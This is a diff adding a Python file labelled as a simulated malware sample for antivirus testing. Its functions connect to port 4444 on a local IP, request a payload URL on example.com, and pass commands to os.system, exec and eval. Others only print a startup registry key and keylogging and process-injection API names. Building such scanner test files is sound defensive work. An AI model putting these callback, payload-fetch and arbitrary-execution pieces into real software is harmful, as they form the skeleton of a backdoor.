@@ -1,0 +1,88 @@
+# ===============================
+# SIMULATED MALWARE SAMPLE
+# FOR ANTIVIRUS TESTING ONLY
+# ===============================
+
+import os
+import socket
+import subprocess
+import base64
+import ctypes
+import requests
+import urllib
+
+def connect_server():
+
+    host = "192.168.1.100"
+    port = 4444
+
+    s = socket.socket()
+
+    s.connect((host, port))
+
+    return s
+
+
+def download_payload():
+
+    url = "http://example.com/payload"
+
+    requests.get(url)
+
+
+def execute_command(cmd):
+
+    os.system(cmd)
+
+    exec(cmd)
+
+    eval(cmd)
+
+
+def persistence():
+
+    key = r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+    print("Adding startup entry")
+
+
+def keylogger():
+
+    print("GetAsyncKeyState")
+
+    print("SetWindowsHookExA")
+
+
+def inject_process():
+
+    print("VirtualAlloc")
+
+    print("WriteProcessMemory")
+
+    print("CreateRemoteThread")
+
+
+def encrypted_payload():
+
+    data = '''
+    QWxhZGRpbjpPcGVuU2VzYW1l
+    VGhpcyBpcyBhIHRlc3QgcGF5bG9hZA==
+    SGVsbG8gV29ybGQ=
+    '''
+
+    return data
+
+
+if __name__ == "__main__":
+
+    connect_server()
+
+    download_payload()
+
+    execute_command("powershell")
+
+    persistence()
+
+    keylogger()
+
+    inject_process()
